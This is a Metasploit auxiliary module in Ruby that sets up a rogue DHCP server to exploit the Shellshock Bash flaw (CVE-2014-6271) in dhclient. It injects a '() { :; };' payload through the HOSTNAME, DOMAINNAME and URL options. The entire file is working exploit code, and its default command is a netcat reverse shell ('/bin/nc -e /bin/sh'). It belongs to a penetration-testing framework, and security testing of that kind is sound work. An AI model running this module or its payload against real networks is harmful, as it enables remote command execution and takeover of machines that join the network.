##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/dhcp'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DHCPServer

  def initialize
    super(
      'Name'        => 'DHCP Client Bash Environment Variable Code Injection',
      'Description'    => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting dhclient network configuration
        scripts through the HOSTNAME, DOMAINNAME, and URL DHCP options.
      },
      'Author'      =>
        [
          'scriptjunkie', 'apconole[at]yahoo.com', # Original DHCP Server auxiliary module
          'Stephane Chazelas', # Vulnerability discovery
          'Ramon de C Valle' # This module
        ],
      'License' => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service',
      'References' => [
        ['CVE', '2014-6271'],
        ['CWE', '94'],
        ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
        ['URL', 'http://seclists.org/oss-sec/2014/q3/649',],
        ['URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/',]
      ],
      'DisclosureDate' => 'Sep 24 2014'
    )

    register_options(
      [
        OptString.new('SRVHOST',     [ true, 'The IP of the DHCP server' ]),
        OptString.new('NETMASK',     [ true, 'The netmask of the local subnet' ]),
        OptString.new('DHCPIPSTART', [ false, 'The first IP to give out' ]),
        OptString.new('DHCPIPEND',   [ false, 'The last IP to give out' ]),
        OptString.new('ROUTER',      [ false, 'The router IP address' ]),
        OptString.new('BROADCAST',   [ false, 'The broadcast address to send to' ]),
        OptString.new('DNSSERVER',   [ false, 'The DNS server IP address' ]),
        # OptString.new('HOSTNAME',    [ false, 'The optional hostname to assign' ]),
        OptString.new('HOSTSTART',   [ false, 'The optional host integer counter' ]),
        OptString.new('FILENAME',    [ false, 'The optional filename of a tftp boot server' ]),
        OptString.new('CMD',         [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
      ], self.class)
  end

  def run
    value = "() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"

    # This loop is required because the current DHCP Server exits after the
    # first interaction.
    loop do
      begin
        start_service({
          'HOSTNAME' => value,
          'DOMAINNAME' => value,
          'URL' => value
        }.merge(datastore))

        while dhcp.thread.alive?
          select(nil, nil, nil, 2)
        end

      rescue Interrupt
        break

      ensure
        stop_service
      end
    end
  end

end
